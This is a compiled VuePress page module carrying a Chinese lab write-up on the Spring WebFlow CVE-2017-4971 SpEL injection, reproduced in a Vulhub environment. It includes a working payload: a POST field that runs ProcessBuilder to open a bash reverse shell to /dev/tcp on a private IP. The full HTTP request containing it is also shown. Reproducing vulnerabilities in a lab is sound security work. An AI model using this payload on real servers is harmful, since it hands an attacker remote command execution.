import{_ as t}from"./plugin-vue_export-helper-c27b6911.js";import{r as o,o as l,c as r,a as e,b as i,d as n,e as s}from"./app-58e4a7d6.js";const c={},d=e("h2",{id:"漏洞描述",tabindex:"-1"},[e("a",{class:"header-anchor",href:"#漏洞描述","aria-hidden":"true"},"#"),i(" 漏洞描述")],-1),p=e("p",null,"Spring WebFlow 是一个适用于开发基于流程的应用程序的框架（如购物逻辑），可以将流程的定义和实现流程行为的类和视图分离开来。在其 2.4.x 版本中，如果我们控制了数据绑定时的 field，将导致一个 SpEL 表达式注入漏洞，最终造成任意命令执行。",-1),u=e("p",null,"参考链接：",-1),g={href:"https://threathunter.org/topic/593d562353ab369c55425a90",target:"_blank",rel:"noopener noreferrer"},h={href:"https://pivotal.io/security/cve-2017-4971",target:"_blank",rel:"noopener noreferrer"},b=s(`<h2 id="环境搭建" tabindex="-1"><a class="header-anchor" href="#环境搭建" aria-hidden="true">#</a> 环境搭建</h2><p>Vulhub 运行测试环境：</p><div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code>docker-compose up -d
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div></div></div><p>等待环境启动后，访问 <code>http://your-ip:8080</code>，将看到一个酒店预订的页面，这是 spring-webflow 官方给的简单示例。</p><h2 id="漏洞复现" tabindex="-1"><a class="header-anchor" href="#漏洞复现" aria-hidden="true">#</a> 漏洞复现</h2><p>首先访问 <code>http://your-ip:8080/login</code>，用页面左边给出的任意一个账号/密码登录系统：</p><figure><img src="https://cb86160.webp.li/makabaka-r1-photo/202203011417883.png" alt="" tabindex="0" loading="lazy"><figcaption></figcaption></figure><p>然后访问 id 为 1 的酒店 <code>http://your-ip:8080/hotels/1</code>，点击预订按钮“Book Hotel”，填写相关信息后点击“Process”（从这一步，其实 WebFlow 就正式开始了）：</p><figure><img src="https://cb86160.webp.li/makabaka-r1-photo/202203011419530.png" alt="" tabindex="0" loading="lazy"><figcaption></figcaption></figure><p>再点击确认“Confirm”：</p><figure><img src="https://cb86160.webp.li/makabaka-r1-photo/202203011419396.png" alt="" tabindex="0" loading="lazy"><figcaption></figcaption></figure><p>此时抓包，抓到一个 POST 数据包，我们向其中添加一个字段（也就是反弹 shell 的 POC）：</p><div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code>_(new+java.lang.ProcessBuilder(&quot;bash&quot;,&quot;-c&quot;,&quot;bash+-i+&gt;%26+/dev/tcp/192.168.174.128/9999+0&gt;%261&quot;)).start()=vulhub
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div></div></div><p>最终的 POST 数据包如下：</p><div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code>POST /hotels/booking?execution=e3s2 HTTP/1.1
Host: your-vps-ip:8080
Content-Length: 172
Cache-Control: max-age=0
Upgrade-Insecure-Requests: 1
Origin: http://your-vps-ip:8080
Content-Type: application/x-www-form-urlencoded
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.102 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Referer: http://your-vps-ip:8080/hotels/booking?execution=e3s2
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9,en;q=0.8
Cookie: lang=zh-CN; COOKIE_SUPPORT=true; GUEST_LANGUAGE_ID=en_US; JSESSIONID=E489BFF839A3C8D346F45D1B1A8BF03F
Connection: close

_eventId_confirm=&amp;_csrf=5509ae82-f763-41a3-b347-44f09e16fd2e&amp;_(new+java.lang.ProcessBuilder(&quot;bash&quot;,&quot;-c&quot;,&quot;bash+-i+&gt;%26+/dev/tcp/192.168.174.128/9999+0&gt;%261&quot;)).start()=vulhub
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><figure><img src="https://cb86160.webp.li/makabaka-r1-photo/202203011438058.png" alt="" tabindex="0" loading="lazy"><figcaption></figcaption></figure><p>成功执行，获得 shell：</p><figure><img src="https://cb86160.webp.li/makabaka-r1-photo/202203011437112.png" alt="" tabindex="0" loading="lazy"><figcaption></figcaption></figure>`,18);function v(m,f){const a=o("ExternalLinkIcon");return l(),r("div",null,[d,p,u,e("ul",null,[e("li",null,[e("a",g,[i("https://threathunter.org/topic/593d562353ab369c55425a90"),n(a)])]),e("li",null,[e("a",h,[i("https://pivotal.io/security/cve-2017-4971"),n(a)])])]),b])}const k=t(c,[["render",v],["__file","Spring WebFlow 远程代码执行漏洞 CVE-2017-4971.html.vue"]]);export{k as default};
